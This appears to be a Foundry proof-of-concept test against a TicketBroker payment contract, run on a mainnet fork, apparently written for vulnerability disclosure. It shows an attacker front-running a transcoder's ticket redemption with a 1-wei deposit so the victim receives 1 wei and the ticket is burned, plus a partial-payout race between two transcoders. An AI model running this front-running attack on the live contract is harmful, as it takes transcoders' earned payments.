// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

import "./base/GovernorBaseTest.sol";
import "contracts/pm/TicketBroker.sol";
import "contracts/pm/mixins/MixinTicketBrokerCore.sol";
import "contracts/pm/mixins/interfaces/MTicketBrokerCore.sol";
import "contracts/rounds/RoundsManager.sol";
import "contracts/bonding/BondingManager.sol";

// forge test --match-contract TicketBrokerDustDepositGriefingPoC --fork-url <ARB_MAINNET_RPC_URL> -vvv
contract TicketBrokerDustDepositGriefingPoC is GovernorBaseTest {
    TicketBroker public immutable TICKET_BROKER;
    RoundsManager public immutable ROUNDS_MANAGER;
    BondingManager public immutable BONDING_MANAGER;

    event WinningTicketTransfer(address indexed sender, address indexed recipient, uint256 amount);

    constructor() {
        TICKET_BROKER = TicketBroker(getContract("TicketBroker"));
        ROUNDS_MANAGER = RoundsManager(getContract("RoundsManager"));
        BONDING_MANAGER = BondingManager(getContract("BondingManager"));
    }

    uint256 senderPrivateKey = 0xb0b;
    address sender;
    address victimTranscoder;
    address attacker;

    function setUp() public {
        sender = CHEATS.addr(senderPrivateKey);
        victimTranscoder = BONDING_MANAGER.getFirstTranscoderInPool();
        attacker = newAddr();
        CHEATS.deal(sender, 2 ether);
        CHEATS.deal(attacker, 0.1 ether);
    }

    function testDustDepositGriefing() public {
        // The sender's deposit is 0
        (MixinTicketBrokerCore.Sender memory info, ) = TICKET_BROKER.getSenderInfo(sender);
        assertEq(info.deposit, 0);

        // The sender's reserve is 0
        assertEq(TICKET_BROKER.getReserveInfo(sender).fundsRemaining, 0);

        // A valid ticket exists for the victim
        (MTicketBrokerCore.Ticket memory ticket, bytes memory sig, uint256 rand) = _createSignedTicket(
            victimTranscoder,
            sender,
            1 ether
        );

        // The attacker frontruns victim's transaction
        CHEATS.prank(attacker);
        TICKET_BROKER.fundDepositAndReserveFor{ value: 1 wei }(sender, 1 wei, 0);

        // Sanity-check: The sender now has 1 wei deposit
        (info, ) = TICKET_BROKER.getSenderInfo(sender);
        assertEq(info.deposit, 1 wei);

        // Consequence 1: The victim now expected to receive 1 wei instead of 1 ETH
        CHEATS.expectEmit(true, true, true, true);
        emit WinningTicketTransfer(sender, victimTranscoder, 1 wei);

        // Unchanged victim transcoder transaction
        CHEATS.prank(victimTranscoder);
        TICKET_BROKER.redeemWinningTicket(ticket, sig, rand);

        // Consequence 2: The ticket is marked as used
        assertTrue(TICKET_BROKER.usedTickets(TICKET_BROKER.getTicketHash(ticket)));

        // Sanity-check: The deposit is consumed
        (info, ) = TICKET_BROKER.getSenderInfo(sender);
        assertEq(info.deposit, 0);
    }

    function testRaceConditionPartialPayout() public {
        address anotherTranscoder = BONDING_MANAGER.getNextTranscoderInPool(victimTranscoder);

        uint256 faceValue = 1 ether;

        // Sender funds 1.5x face value: enough to fully cover one ticket but not two
        CHEATS.prank(sender);
        TICKET_BROKER.fundDepositAndReserve{ value: faceValue + faceValue / 2 }(faceValue + faceValue / 2, 0);

        (MixinTicketBrokerCore.Sender memory info, ) = TICKET_BROKER.getSenderInfo(sender);
        assertEq(info.deposit, faceValue + faceValue / 2);

        // Two valid winning tickets from the same sender to two different transcoders
        (MTicketBrokerCore.Ticket memory ticket1, bytes memory sig1, uint256 rand1) = _createSignedTicket(
            anotherTranscoder,
            sender,
            faceValue
        );
        (MTicketBrokerCore.Ticket memory ticket2, bytes memory sig2, uint256 rand2) = _createSignedTicket(
            victimTranscoder,
            sender,
            faceValue
        );

        // Another transcoder redeems first and receives full face value
        CHEATS.expectEmit(true, true, true, true);
        emit WinningTicketTransfer(sender, anotherTranscoder, faceValue);
        CHEATS.prank(anotherTranscoder);
        TICKET_BROKER.redeemWinningTicket(ticket1, sig1, rand1);

        // Deposit is now 0.5 ETH, not enough to cover the victim's ticket in full
        (info, ) = TICKET_BROKER.getSenderInfo(sender);
        assertEq(info.deposit, faceValue / 2);

        // Victim transcoder redeems second and receives only 0.5 ETH despite a valid 1 ETH ticket
        CHEATS.expectEmit(true, true, true, true);
        emit WinningTicketTransfer(sender, victimTranscoder, faceValue / 2);
        CHEATS.prank(victimTranscoder);
        TICKET_BROKER.redeemWinningTicket(ticket2, sig2, rand2);

        // Ticket is permanently burned despite the partial payout
        assertTrue(TICKET_BROKER.usedTickets(TICKET_BROKER.getTicketHash(ticket2)));
        (info, ) = TICKET_BROKER.getSenderInfo(sender);
        assertEq(info.deposit, 0);
    }

    function _createSignedTicket(
        address _recipient,
        address _sender,
        uint256 _faceValue
    )
        internal
        returns (
            MTicketBrokerCore.Ticket memory,
            bytes memory,
            uint256
        )
    {
        uint256 recipientRand = 987654321;
        uint256 creationRound = ROUNDS_MANAGER.currentRound();
        bytes32 blockHash = ROUNDS_MANAGER.blockHashForRound(creationRound);

        MTicketBrokerCore.Ticket memory ticket = MTicketBrokerCore.Ticket({
            recipient: _recipient,
            sender: _sender,
            faceValue: _faceValue,
            winProb: type(uint256).max,
            senderNonce: 0,
            recipientRandHash: keccak256(abi.encodePacked(recipientRand)),
            auxData: abi.encodePacked(creationRound, blockHash)
        });

        bytes32 ticketHash = TICKET_BROKER.getTicketHash(ticket);
        bytes32 ethSignedHash = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", ticketHash));
        (uint8 v, bytes32 r, bytes32 s) = CHEATS.sign(senderPrivateKey, ethSignedHash);

        return (ticket, abi.encodePacked(r, s, v), recipientRand);
    }
}
